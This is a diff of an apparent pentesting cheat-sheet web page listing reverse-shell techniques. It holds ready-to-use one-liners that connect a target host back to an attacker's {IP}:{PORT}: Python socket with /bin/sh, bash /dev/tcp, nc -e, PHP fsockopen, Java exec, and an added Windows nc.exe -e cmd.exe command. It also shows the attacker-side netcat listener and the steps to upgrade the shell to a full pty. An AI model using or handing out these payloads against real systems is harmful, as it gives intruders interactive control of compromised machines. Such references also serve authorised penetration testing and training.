@@ -289,6 +289,7 @@
 with a couple <code>IP:port</code> the server can access. Then, on your local machine you open
 a listener with <code>netcat</code>:</p>
 <h2 id="on-local-machine">On local machine</h2>
+<h3 id="listen-with-netcat">Listen with NetCat</h3>
 <p>To listen for an incoming connection and upgrade to a pty shell:</p>
 <pre><code class="language-bash line-numbers">nc -lvnp {PORT}
 
@@ -296,6 +297,11 @@ a listener with <code>netcat</code>:</p>
 python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 </code></pre>
 
+<blockquote>
+<p>On macOS use the <code>netcat</code> from <a href="https://formulae.brew.sh/formula/netcat" target="_blank">homebrew</a>
+instead of the one provided by the OS</p>
+</blockquote>
+<h3 id="upgrade-the-shell">Upgrade the shell</h3>
 <p>Then, <code>Ctrl-Z</code> to suspend the connection and return to your own terminal.
 Type on your terminal:</p>
 <pre><code class="language-bash line-numbers">stty raw -echo
@@ -306,17 +312,22 @@ Type on your terminal:</p>
 reset
 </code></pre>
 
-<p>On target host</p>
-<pre><code class="language-none line-numbers">export SHELL=bash
+<p>On target host:</p>
+<pre><code class="language-bash line-numbers">export SHELL=bash
 export TERM=xterm-256color
 stty rows 24 columns 80
 </code></pre>
 
+<p>Now you should have a complete shell with shortcuts available.</p>
 <h2 id="on-the-remote-server">On the remote server</h2>
 <h3 id="windows">Windows</h3>
-<pre><code class="language-bash line-numbers">&gt; cmd.exe /C &lt;cmd&gt;
+<p>Upload <a href="/assets/nc.exe"><code>nc.exe</code></a> (or <a href="/assets/nc64.exe"><code>nc64.exe</code></a>) on the
+remote server then use the command (same as <a href="#netcat">NetCat</a>):</p>
+<pre><code class="language-bash line-numbers">cmd.exe /C &quot;nc.exe {IP} {PORT} -e cmd.exe&quot;
 </code></pre>
 
+<h3 id="powershell">PowerShell</h3>
+<p>This is explain in the <a href="../windows/#download-and-execute-script">Windows / Download and execute script section</a>.</p>
 <h3 id="python">Python</h3>
 <pre><code class="language-bash line-numbers">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{IP}&quot;,{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
@@ -325,6 +336,11 @@ stty rows 24 columns 80
 <pre><code class="language-bash line-numbers">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
 </code></pre>
 
+<blockquote>
+<p>To use the bash's built-in <code>/dev/tcp</code> device file the use must use <code>/bin/bash</code>
+as shell. Often it uses <code>sh</code> or <code>dash</code>, then you can use <code>bash -c "&lt;cmd&gt;"</code> to
+force the <code>bash</code></p>
+</blockquote>
 <h3 id="netcat">Netcat</h3>
 <pre><code class="language-bash line-numbers">nc -e /bin/sh {IP} {PORT}
 </code></pre>
@@ -334,7 +350,9 @@ stty rows 24 columns 80
 String[] cmd={&quot;cmd&quot;,&quot;/C&quot;,&quot;&lt;cmd&gt;&quot;};Runtime.getRuntime().exec(cmd);
 </code></pre>
 
+<blockquote>
 <p>This payload can also work with <code>BeanShell</code> scripts.</p>
+</blockquote>
 <h3 id="php">PHP</h3>
 <pre><code class="language-bash line-numbers">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
